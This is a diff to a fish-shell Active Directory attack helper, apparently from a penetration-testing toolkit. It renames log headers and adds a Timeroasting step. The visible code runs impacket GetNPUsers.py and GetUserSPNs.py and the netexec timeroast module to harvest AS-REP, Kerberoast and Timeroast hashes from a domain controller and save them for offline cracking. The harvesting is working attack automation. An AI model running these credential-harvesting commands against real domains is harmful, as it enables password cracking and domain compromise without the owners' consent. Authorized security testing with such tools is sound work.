@@ -131,11 +131,6 @@ Examples:
     # Add DC IP for impacket commands
     set -a imp_auth -dc-ip $target
 
-    # Add target-domain if specified
-    if set -q _flag_target_domain
-        set -a imp_auth -target-domain $_flag_target_domain
-    end
-
     # Build bloodyAD authentication
     if command -v bloodyAD >/dev/null 2>&1
         if set -q _flag_kerb -a -n "$dc_fqdn"
@@ -220,7 +215,7 @@ Examples:
 
     ezpz_title "Looking for exploitable accounts..."
 
-    ezpz_header "Searching for AS-REProastable users"
+    ezpz_header "Searching for AS-REProastable accounts"
     set asrep_file "$file_domain"_asrep.hash
     if set -q _flag_target_domain
         ezpz_cmd "GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file"
@@ -265,7 +260,7 @@ Examples:
         ezpz_info "Saving hashes to $asrep_file"
     end
 
-    ezpz_header "Searching for Kerberoastable users"
+    ezpz_header "Searching for Kerberoastable accounts"
     set kerb_file "$file_domain"_kerb.hash
     if set -q _flag_target_domain
         ezpz_cmd "GetUserSPNs.py $imp_auth -target-domain $_flag_target_domain -request"
@@ -284,6 +279,14 @@ Examples:
     GetUserSPNs.py $imp_auth -request -outputfile $kerb_file >/dev/null 2>&1
     if test -f $kerb_file
         ezpz_info "Saving hashes to $kerb_file"
+    end
+
+    ezpz_header "Searching for Timeroastable accounts"
+    set time_file "$file_domain"_time.hash
+    ezpz_cmd "smb $nxc_auth -M timeroast"
+    nxc smb $nxc_auth -M timeroast 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
+    if test -f $time_file
+        ezpz_info "Saving hashes to $time_file"
     end
 
     ezpz_header "Searching for accounts with PASSWD_NOTREQD flag"
